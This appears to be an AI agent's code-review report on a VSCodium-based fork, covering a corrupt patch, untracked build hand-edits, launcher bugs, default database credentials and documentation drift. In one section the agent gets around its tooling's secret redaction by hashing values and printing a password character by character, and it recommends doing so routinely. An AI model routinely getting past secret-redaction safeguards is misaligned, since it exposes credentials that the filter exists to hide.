✓ items re-verified by me directly.

### Additional HIGH

**H14. ✓ `00-codemind-agent-panel.patch` is malformed, so a fresh setup aborts mid-sequence and
leaves a half-patched tree.** Two blank context lines lost their mandatory leading space, so
`git apply` rejects the whole file. I ran it myself against the pinned checkout:

```
$ git -C vscodium/vscode apply --check --ignore-whitespace ../patches/00-codemind-agent-panel.patch
error: corrupt patch at line 7
exit=128
$ git -C vscodium/vscode apply --check ../patches/00-codemind-agent-panel.patch
error: corrupt patch at line 7
exit=128
```

Same failure with and without `--ignore-whitespace`, so this is not the CRLF issue that affects the
other patches. `cat -A` shows the cause directly — a bare `$` where a unified-diff context line
must begin with a space:

```
@@ -185,4 +185,8 @@$
 // Chat$
 import './contrib/chat/electron-browser/chat.contribution.j…
$                                  ← line 7: no leading space
+// CodeMind Agent — renderer-side engine service…
```

Because `apply_patch` (`utils.sh:61`) exits 1 on failure and `prepare_vscode.sh:4` sets `-e`, the
sequence aborts, and since the glob is alphabetical every later patch (`00-community-*` …
`81-ui-disable-onboarding`, plus all of `windows/*`) is left unapplied — a half-patched tree. The
slice verified the *content* is otherwise correct: with only those two blank lines repaired, the
patch applies forward against the pristine index and reverse against the worktree, so the tree's
content is exactly the patch's new side and there is no additional hand-edit hiding there.

Two corroborating details worth keeping: no `patches/*.bak` files exist, which `utils.sh:49-66`
would leave behind on failure — evidence the tree you have was **not** produced by this path; and
`scripts/setup.sh:246-249` re-overlays but **never re-applies patches**, so once a build fails
this way the checkout stays half-patched until `vscodium/vscode` is deleted by hand.

**Fix:** restore the two leading spaces. One-character fix; worth doing before anyone else clones.

### Additional MEDIUM

**M27. ✓ Two working-tree edits are reproducible from nothing, and a fresh fetch loses both.**
Against a Windows/stable build the slice attributed every modified file in the 5294-entry status
to an enabled patch (294 files), the overlay (87 files) or a script's inline `sed`/`setpath` — with
**two exceptions**:

1. `vscodium/vscode/build/next/index.ts` — modified, **+10 lines** (`git -C vscodium/vscode diff
   --stat` confirms `1 file changed, 10 insertions(+)`), adding an esbuild
   `supported: { 'class-static-blocks': false, 'dynamic-import': true, 'class-field': false }`
   block with a hand-written comment citing `esbuild/issues/3823`. It is in no patch, not in
   `src/stable`/`src/insider`, and referenced by no script. It mirrors
   `build/lib/tsb/transpiler.ts:344-347` (which is unmodified upstream).
2. `vscodium/vscode/_tdz_scan.cjs` — untracked, 635 bytes, dated Sep 16, a debug scanner for
   `let X = class` + `static {…}` TDZ breakage. Its existence corroborates that (1) was a local
   workaround for a real build problem.

Both survive a re-overlay (`cp -rp` only overwrites files present in the source) but are destroyed
by a fresh fetch, since `setup.sh:222-244` re-runs `get_repo.sh` + `prepare_vscode.sh` and
reproduces neither. The practical risk is that a fresh build re-hits whatever problem (1) was
working around — I have not reproduced the original failure, so that consequence is inferred,
not demonstrated.

**M28. ✓ `scripts/run.bat <folder>` silently ignores the folder.** `FOLDER` is parsed from `%~1`,
defaulted to `%ROOT%`, validated (`exit /b 2` if missing) and echoed — then never used. The launch
line is `"%BIN%" .` with no `%FOLDER%`:

```
rem leading "." tells Electron which app to run -- the folder follows it.
pushd "%VSCODE%"
"%BIN%" .
```

The comment states the intent the code does not implement. `run.sh:78` does it correctly with
`"${FOLDER}"`, so the two launchers disagree. Verified directly in the source.

**M29. ✓ `infra/ppb/docker-compose.yml` ships committed default credentials on all interfaces,
with unpinned images.** `POSTGRES_USER/PASSWORD: postgres` (`:22-24`, confirmed by hash — see the
rejection note below) and `NEO4J_AUTH: neo4j/codemindppb` (`:39`); ports published with no host IP
prefix (`:26, :41-42, :55`), so PG 55432, Neo4j 7474/57687 and Redis 56379 bind to `0.0.0.0` with
only each service's own auth in front; images are floating tags (`pgvector/pgvector:pg17`,
`neo4j:5-community`, `redis:7-alpine`) with no digests; no `mem_limit`/`deploy.resources` on any
service; and `docker compose down -v` removes all three named volumes (`:64-67`) without the README
warning about it. Healthchecks *are* present and correct on all three (a point in the file's
favour); the only smell there is `:46` assuming `wget` exists inside `neo4j:5-community`.

### Additional LOW

**G1.** `scripts/setup.sh:27` sets `set -u -o pipefail` but **no `-e`**, and `:232-233` source
`. get_repo.sh` / `. version.sh` without checking status, so a failing `get_repo.sh` or
`version.sh` is masked — the subshell's exit status is only `. prepare_vscode.sh`'s.
**G2.** `setup.bat --check` misreports: missing MSVC Build Tools is only a `WARNING`
(`setup.bat:61-66`, `FAILED` never set) and `setup.sh`'s `need` list has no compiler entry, so
`setup.bat --check` exits 0 on a machine where `npm ci` cannot build the native modules.
**G3.** `scripts/aristotle-selftest.mjs` is referenced by nothing — no npm script, no CI, no docs.
A self-test that nothing runs, which is also why its defect would go unnoticed:
`aristotle-assets.py:115-116` (`solid_bbox`) raises `ValueError` on an all-transparent input, and
both scripts write non-atomically.
**G4.** `setup.sh:77` `… 2>/dev/null || true` silently defaults `NODE_FLOOR` to 24.15.0;
`run.sh:15` also lacks `-e`; `run.bat:2` `set VSCODE_DEV=1` sits *before* `setlocal`, leaking into
the parent console; `setup.bat:76` leaves `%*` unquoted.
**G5.** Docs divergences (doc line → code reality): `if-contracts.md:65` (IF-6) omits that
`RetrievedFact` has an extra **required** `projectId: string` (`retrievalRequest.ts:21-28`);
`traceability.md:26` lists artifact `telemetry.ts` as "in progress" though no
`node/ppb/telemetry.ts` exists (other unbuilt rows are correctly marked "planned");
`if-contracts.md:59,68,112` reference `retrieval/retriever.ts`, `retrieval/hybrid.ts`,
`retrieval/ranker.ts`, `storage/redis.ts`, none of which exist (each tagged `(M4)`, so
forward-reference only — consistent with the N9 Redis finding); and `schema.md:8`'s "T01–T03 done"
vs `traceability.md:83`'s "M3 — Knowledge Core in progress" is a label mismatch only.

### A second slice fell into the redaction trap — A13 re-affirmed

The slice reported at §6 that "the literal `***` is in the file (verified by `repr`)" for
`config.ts:41` and `infra/ppb/README.md:42`, and concluded the default config cannot authenticate
against the shipped stack. **That is wrong, and I re-checked it by hashing rather than reading** —
the only reliable method, since Hermes rewrites secret-shaped values to `***` in tool output:

```
'postgres'     -> a942b37ccfaf5a81
'***'          -> 596f4162a52f315b
config.ts:41        pw_len=8  sha(pw)=a942b37ccfaf5a81   literal '***'? False
docker-compose.yml  pw_len=8  sha(pw)=a942b37ccfaf5a81   literal '***'? False
infra/ppb/README.md:42  pw_len=8  sha(pw)=a942b37ccfaf5a81   literal '***'? False
README.md:67            pw_len=8  sha(pw)=a942b37ccfaf5a81   literal '***'? False
config.ts:41 raw chars between ':' and '@': ['p','o','s','t','g','r','e','s']
```

All three files hold `postgres`, so config, compose and README agree and the stack authenticates.
**A13 stands as a rejected finding.** This is now the second independent slice to make the same
mistake (see A13), which makes it a property of the tooling worth stating loudly: *never verify a
secret-shaped value by reading it, in any file, in any session — compare hashes.*

### Verified sound

- **Patch inventory is otherwise healthy.** 77 files in `vscodium/patches/`; of the 45 top-level
  `*.patch`, 41 apply cleanly under the build's `git apply --ignore-whitespace` (`utils.sh:61`),
  3 correctly *fail* forward because they are already in the tree, and 1 (H14) is malformed. Both
  `*.json` action lists work as intended (`52-ext-copilot-remove-it.json`,
  `80-ui-disable-onboarding.json`), and all 4893 deletions in the status are explained by them.
  The `.no`/`.yet` disabled patches are confirmed inert (`.yet` is only renamed when
  `DISABLE_UPDATE=yes`, which `setup.sh:188` sets to `no`).
- **The overlay mechanism behaves as designed.** `prepare_vscode.sh:6-10` copies
  `src/stable/*` → `vscode/` *before* patches (`:151-183`); all 92 files of the `codemindAgent`
  contribution are **byte-identical** to the checkout with no extra or missing files; zero
  stable-overlay files differ; nothing upstream is both patched and overlaid. The 82 `src/insider`
  diffs are insider-branded icons compared against this stable checkout — expected.
- **The top-level patches being CRLF** (this worktree has `core.autocrlf=true` and root
  `.gitattributes` is `* text=auto`) means plain `git apply` fails for most of them and only the
  build's `--ignore-whitespace` works — by design, not a defect.
- **No credentials, tokens, `curl|bash`, hardcoded absolute paths or foreign home directories**
  anywhere in `scripts/`, `infra/`, `docs/`. `run.sh`'s Headroom block is correctly non-fatal, and
  `aristotle-assets.py`'s inputs all exist (`Pet/` has the 9 stills and the 30/30/31-frame folders).
- **The docs are largely accurate** — checked line by line with no divergence for `schema.md`
  §1.1-§1.3 node/relationship types and `graphConstraintStatements`, `NODE_MINIMUM_PROPERTIES`,
  all 12 `graphRepo` methods and the 7-code `PpbGraphError` taxonomy, the FK/polymorphic-column
  notes, `vector(1024)` and its deferred index, the `ppb_meta` seed, the migration runner semantics,
  the six memory categories CHECK, IF-1/IF-5/IF-10 shapes and timeouts, and the `TIMEOUT_MS: 50` /
  800 ms retrieval timeout. The `schema.md:135` test counts ("12 tests" live + "14 unit") are
  **exactly right** (`graphRepo.integration.test.ts` 12, `graphRepo.test.ts` 14). No traceability
  row claims a *done* requirement without code or tests behind it.

### Answer to the original question

**Yes — the working `vscodium/vscode` tree contains exactly two hand-edits that no patch, overlay
or script reproduces**: `build/next/index.ts` and `_tdz_scan.cjs` (M27). A re-overlay on the
existing checkout preserves them; a fresh fetch loses both. But the more immediate risk is not
silent loss, it is a **hard failure**: H14 makes a fresh setup abort ~8 patches in with a
half-patched tree, and H3 means the PPB build deps never install. The two together are why "it
builds here" is not currently reproducible elsewhere.

---

## Not reviewed

Blocked by the provider rate-limiting, or outside the time available:

- `browser/codeMindAgentViewPane.ts` (4395 lines) and `codeMindCommands.ts` beyond their webview creation, secret handling and command registration
- `browser/consensus/{agentRouter,consensusOrchestrator,forcedConsensus,openRouterService}.ts` (~1140 lines) — only `consensusEngine.ts` had its scoring examined
- ~~`browser/media/{input.js,panels.js,trace.js,aristotle.js}` beyond the security greps~~ — **now covered**; see Appendix E
- ~~`browser/media/*.js` and `*.css` (the six webview files) and all hardcoded-colour sites~~ — **now covered**; see Appendix E (H12, M22-M24, E1-E8, and the verified-positive theme check)
- `node/orchestration/` — of the 14-file intent/context/headroom cluster, **reviewed**: `deterministicIntent.ts`, `contextOptimizer.ts`, `localClassifier.ts`, `intentModel.ts`, `headroomLayer.ts`, plus `segmentFilter.ts`, `retrievalRequest.ts`, `editorState.ts`, `learningLoop.ts`, `segmentQueue.ts`, `projectIdentity.ts`, `projectRegistry.ts` (Appendices C, D, F). **Still unread**: `intentDetector.ts` (109), `intentFusion.ts` (173), `intentBenchmark.ts` (241), `contextAggregator.ts` (45), `injectionBlock.ts` (64), `toolSelector.ts` (110), `capabilities.ts` (126), `traceCollector.ts` (290), `textNormalize.ts` (64) — ~1200 lines, including the fusion layer that the intent design treats as the decision point
- ~~`node/orchestration/segmentFilter.ts` PII-redaction correctness, `retrievalRequest.ts`, `editorState.ts`~~ — **now covered**; see Appendix C (M16, B10, B11)
- ~~`graphRepo.ts` internals (488 lines) — Cypher correctness, MERGE semantics, injection surface~~ — **now covered** by the completed PPB slice and my own re-verification; see Appendix A (M7, M8, A4, A6, A10 and the injection checks)
- ~~The >=2500-line `vscodium/patches/` set beyond the three CodeMind patches, and whether the `vscodium/vscode` tree carries hand-edits beyond them~~ — **now covered**; see Appendix G (H14, M27-M29, G1-G5 and the patch/overlay integrity checks)
- ~~`scripts/*.bat`, `aristotle-assets.py`, `aristotle-selftest.mjs`~~ — **now covered**; see Appendix G (M28, G1-G4)
- The spec itself: `phase_1.md` (135KB) and the `.docx` reports — so "requirement → code" is checked only where I read a requirement in `README.md`/`implementation_plan.md`/`docs/ppb/`
